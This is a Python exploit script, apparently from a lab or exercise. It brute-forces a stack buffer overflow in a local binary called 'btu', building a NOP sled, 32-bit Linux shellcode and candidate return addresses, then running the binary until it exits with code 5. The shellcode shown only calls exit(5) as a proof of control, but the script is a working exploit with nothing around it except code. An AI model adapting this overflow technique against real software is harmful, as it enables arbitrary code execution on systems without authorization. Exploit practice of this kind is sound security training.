import subprocess

# Shellcode and NOP sled
shellcode = (
    b"\x90" * 21 +
    b"\x31\xc0\xb0\x01\x31\xdb\xb3\x05\xcd\x80" +
    b"\x90" * 21
)

# Base return address (as int)
base_ret_addr = 0xffffc838

# Try small offsets
for offset in range(-32, 256, 4):
    if offset != 0: 
        # Convert address to little-endian bytes
        ret_addr = (base_ret_addr + offset).to_bytes(4, byteorder="little")

        # Build full payload
        full_payload = shellcode + ret_addr

        print(f"\n[+] Trying return address: 0x{base_ret_addr + offset:08x}")

        # Run binary with Latin1-decoded bytes to preserve full range
        result = subprocess.run(["./build/bin/btu", "remove", "1024", full_payload.decode("latin1")])

        if (result.returncode == 5):
            print(f"[+] Exit code was: {result.returncode}")
